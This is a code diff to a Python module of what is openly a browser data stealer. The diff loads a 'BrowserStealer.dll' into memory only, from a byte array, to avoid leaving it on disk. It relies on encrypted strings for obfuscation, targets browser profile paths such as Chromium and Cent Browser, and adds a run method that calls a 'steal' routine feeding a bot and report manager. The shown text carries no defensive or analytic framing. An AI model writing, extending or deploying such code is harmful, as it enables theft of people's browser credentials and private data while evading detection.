@@ -7,40 +7,44 @@ import shutil
 from core.obfuscation import decrypt_string
 from core.cloud import CloudModule
 
+from core.base import BaseModule
+
 def log_debug(msg):
     try:
-        debug_file = os.path.join(os.environ.get("TEMP", "."), decrypt_string("DF0MNCo0Swg5WxtCDQ=="))
+        # Standardized log path
+        debug_file = os.path.join(os.environ.get("TEMP", "."), "debug_log.txt")
         with open(debug_file, "a", encoding="utf-8") as f:
-            f.write(decrypt_string("FVYZHyslMA8/WQRXBRFPB05OWDAMIzYVKRIYdR1dExYLb1gQIyI+HwYZ"))
+            f.write(f"{datetime.now()}: {msg}\n")
     except: pass
 
 try:
-    log_debug(decrypt_string("PVcZGS05MAw9VwxXABkkCAFFCw48Ai0HOxsPSlxdChY="))
-    dll_name = decrypt_string("LEAXHD00KzEuEgtUF0tIHgJe")
-    possible_paths = [
+    from System.Reflection import Assembly
+    from System.IO import File
+    dll_name = "BrowserStealer.dll"
+    # Search in current dir, core/ and native_modules/
+    search_paths = [
         os.path.join(os.path.dirname(__file__), dll_name),
-        os.path.join(os.path.dirname(os.path.dirname(__file__)), dll_name),
-        os.path.join(os.path.dirname(os.path.dirname(__file__)), "bin", dll_name)
+        os.path.join(os.path.dirname(__file__), "..", "native_modules", dll_name),
+        os.path.join(os.getcwd(), "native_modules", dll_name)
     ]
     
-    loaded = False
-    for p in possible_paths:
-        if os.path.exists(p):
-            clr.AddReference(p)
-            loaded = True
-            break
-            
-    if loaded:
-        from StealthModule import BrowserManager
-        CS_STEALER_AVAILABLE = True
-    else:
-        CS_STEALER_AVAILABLE = False
+    CS_STEALER_AVAILABLE = False
+    for _p in search_paths:
+        if os.path.exists(_p):
+            try:
+                # S-09: RAM-Only loading from byte array
+                raw_bytes = File.ReadAllBytes(os.path.abspath(_p))
+                Assembly.Load(raw_bytes)
+                from StealthModule import BrowserManager
+                CS_STEALER_AVAILABLE = True
+                break
+            except: continue
 except Exception:
     CS_STEALER_AVAILABLE = False
 
-class BrowserModule:
-    def __init__(self, temp_dir: str):
-        self.temp_dir = temp_dir
+class BrowserModule(BaseModule):
+    def __init__(self, bot=None, report_manager=None, temp_dir=None):
+        super().__init__(bot, report_manager, temp_dir)
         local = os.environ.get('LOCALAPPDATA', '')
         roaming = os.environ.get('APPDATA', '')
         
@@ -55,6 +59,16 @@ class BrowserModule:
             'cent': {'name': 'Cent Browser', 'path': os.path.join(local, decrypt_string('LVcWHwwjNhUpEhhkLmwVHxwSPAo6MA=='))},
             'chromium': {'name': 'Chromium', 'path': os.path.join(local, decrypt_string('LVoKBCM4LA8GKz9LF0tGPg9GGQ=='))}
         }
+
+    def run(self) -> bool:
+        """A-04: Implementation of standardized run method."""
+        try:
+            self.log("Starting browser data extraction...")
+            data = self.steal()
+            return True if data.get('profiles_found', 0) > 0 else False
+        except Exception as e:
+            self.log(f"Extraction failed: {e}")
+            return False
 
     def steal(self, browser_id: Optional[str] = None) -> Dict[str, Any]:
         """Steals browser data using C# DLL and saves to output/Stealer/"""
